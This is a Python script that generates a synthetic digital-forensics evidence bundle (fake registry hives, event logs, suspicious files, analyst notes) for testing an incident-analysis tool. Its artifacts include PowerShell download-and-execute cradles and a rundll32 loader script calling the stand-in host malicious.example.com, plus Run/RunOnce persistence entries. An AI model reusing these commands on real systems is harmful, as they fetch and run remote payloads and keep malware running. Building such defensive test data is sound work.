#!/usr/bin/env python3
import os
import textwrap
import zipfile
from pathlib import Path

BUNDLE_DIR = Path("realistic_dfir_bundle_flat")
ZIP_NAME = "realistic_dfir_bundle.zip"


def write_text(path: Path, content: str):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")


def build_structure(base: Path):
    """
    Build a synthetic but realistic DFIR bundle with a *flat* root.
    When we zip this folder, the archive will contain files like:

      SOFTWARE
      SYSTEM
      NTUSER.DAT
      WindowsEventLogs/...
      SuspiciousFiles/...
      Notes/operator_notes.txt

    No extra top-level container directory in the ZIP.
    """

    # --- 1. "Registry hives" (TEXT placeholders, names are realistic) ---
    write_text(
        base / "SOFTWARE",
        """
        ; Synthetic SOFTWARE hive placeholder (NOT a real registry hive)
        [Microsoft\\Windows\\CurrentVersion\\Run]
        "BadUpdater"="C:\\\\Users\\\\Public\\\\updater.exe /silent"
        "SystemFix"="cmd.exe /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/run.ps1')"

        [Microsoft\\Windows\\CurrentVersion\\RunOnce]
        "Cleanup"="wscript.exe C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\clean.js"
        """,
    )

    write_text(
        base / "SYSTEM",
        """
        ; Synthetic SYSTEM hive placeholder
        [ControlSet001\\Services\\BadDriver]
        "ImagePath"="C:\\\\Windows\\\\System32\\\\drivers\\\\baddriver.sys"
        """,
    )

    write_text(base / "SAM", "; Synthetic SAM hive placeholder\n")
    write_text(base / "SECURITY", "; Synthetic SECURITY hive placeholder\n")

    write_text(
        base / "NTUSER.DAT",
        """
        ; Synthetic NTUSER.DAT placeholder
        [Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]
        "Stage2"="C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\stage2.bat"
        """,
    )

    # --- 2. "EVTX" logs (XML-ish text but named .evtx) -------------------
    logs_dir = base / "WindowsEventLogs"

    write_text(
        logs_dir / "Security.evtx",
        """
        <!-- Synthetic Security.evtx (NOT a real EVTX binary) -->
        <Event>
          <System>
            <EventID>4688</EventID>
            <TimeCreated SystemTime="2025-03-10T13:05:42Z" />
            <ProcessName>powershell.exe</ProcessName>
            <ParentProcessName>cmd.exe</ParentProcessName>
          </System>
          <EventData>
            <Data Name="NewProcessName">C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe</Data>
            <Data Name="CommandLine">powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')</Data>
          </EventData>
        </Event>

        <Event>
          <System>
            <EventID>4688</EventID>
            <TimeCreated SystemTime="2025-03-10T13:06:10Z" />
            <ProcessName>rundll32.exe</ProcessName>
          </System>
          <EventData>
            <Data Name="NewProcessName">C:\\\\Windows\\\\System32\\\\rundll32.exe</Data>
            <Data Name="CommandLine">rundll32.exe C:\\\\Users\\\\Public\\\\loader.dll,Start</Data>
          </EventData>
        </Event>
        """,
    )

    write_text(
        logs_dir / "PowerShell.evtx",
        """
        <!-- Synthetic PowerShell.evtx -->
        <Event>
          <System>
            <EventID>4104</EventID>
            <TimeCreated SystemTime="2025-03-10T13:05:45Z" />
          </System>
          <EventData>
            <Data Name="ScriptBlockText">IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')</Data>
          </EventData>
        </Event>
        """,
    )

    write_text(
        logs_dir / "System.evtx",
        """
        <!-- Synthetic System.evtx -->
        <Event>
          <System>
            <EventID>7045</EventID>
            <TimeCreated SystemTime="2025-03-10T13:07:10Z" />
            <ProviderName>Service Control Manager</ProviderName>
          </System>
          <EventData>
            <Data Name="ServiceName">BadUpdaterSvc</Data>
            <Data Name="ImagePath">C:\\\\Users\\\\Public\\\\updater.exe</Data>
          </EventData>
        </Event>
        """,
    )

    write_text(
        logs_dir / "Application.evtx",
        """
        <!-- Synthetic Application.evtx -->
        <Event>
          <System>
            <EventID>1000</EventID>
            <TimeCreated SystemTime="2025-03-10T13:08:00Z" />
            <SourceName>BadUpdater.exe</SourceName>
          </System>
          <EventData>
            <Data Name="Message">BadUpdater.exe encountered an exception while contacting http://malicious.example.com/beacon</Data>
          </EventData>
        </Event>
        """,
    )

    # --- 3. Suspicious files --------------------------------------------
    susp_dir = base / "SuspiciousFiles"

    write_text(
        susp_dir / "script.ps1",
        """
        # Synthetic malicious PowerShell script
        $url = "http://malicious.example.com/c2"
        $out = "$env:TEMP\\stage2.dll"
        Invoke-WebRequest -Uri $url -OutFile $out
        rundll32.exe $out,Start
        """,
    )

    write_text(
        susp_dir / "payload.exe",
        "This is a placeholder for a malicious EXE. Do NOT execute.\n",
    )

    write_text(
        susp_dir / "loader.dll",
        "This is a placeholder for a malicious DLL. Do NOT load.\n",
    )

    write_text(
        susp_dir / "C2_url.txt",
        "http://malicious.example.com/beacon\n",
    )

    # --- 4. Operator notes ----------------------------------------------
    notes_dir = base / "Notes"

    write_text(
        notes_dir / "operator_notes.txt",
        """
        Incident summary (synthetic):

        - User reported slow system and suspicious pop-ups.
        - Autorun entry found under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
          pointing to C:\\Users\\Public\\updater.exe /silent (BadUpdater).
        - PowerShell process spawned from cmd.exe with a download cradle:
          powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')
        - rundll32.exe later executed loader.dll from C:\\Users\\Public.
        - Evidence suggests:
            * Initial execution via user action (possibly phishing attachment).
            * Persistence using Run and RunOnce registry keys.
            * Payload download from external C2 (malicious.example.com).
            * Use of LOLBins (powershell.exe, rundll32.exe, wscript.exe).
        """,
    )


def make_flat_zip(base: Path, zip_path: Path):
    """
    Zip the contents of `base` so that files appear at archive root.
    i.e., archive members are relative to `base`, NOT including `base` itself.
    """
    if zip_path.exists():
        zip_path.unlink()

    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for p in base.rglob("*"):
            if p.is_file():
                rel = p.relative_to(base)  # <-- flatten root
                zf.write(p, rel.as_posix())


def main():
    cwd = Path.cwd()
    base = cwd / BUNDLE_DIR

    if base.exists():
        print(f"[!] {base} already exists. Re-using it (files may be overwritten).")
    else:
        base.mkdir(parents=True)

    print(f"[+] Building synthetic DFIR bundle at: {base}")
    build_structure(base)

    zip_path = cwd / ZIP_NAME
    make_flat_zip(base, zip_path)

    print(f"[+] Created ZIP: {zip_path}")
    print("\nNext steps:")
    print("  1) Go to your RADLab UI at http://localhost:8080")
    print("  2) Use the 'Ingest (File / Zip)' section")
    print("  3) Select realistic_dfir_bundle.zip and upload")
    print("  4) Run Explain Case and MITRE tagging on that case")


if __name__ == "__main__":
    main()
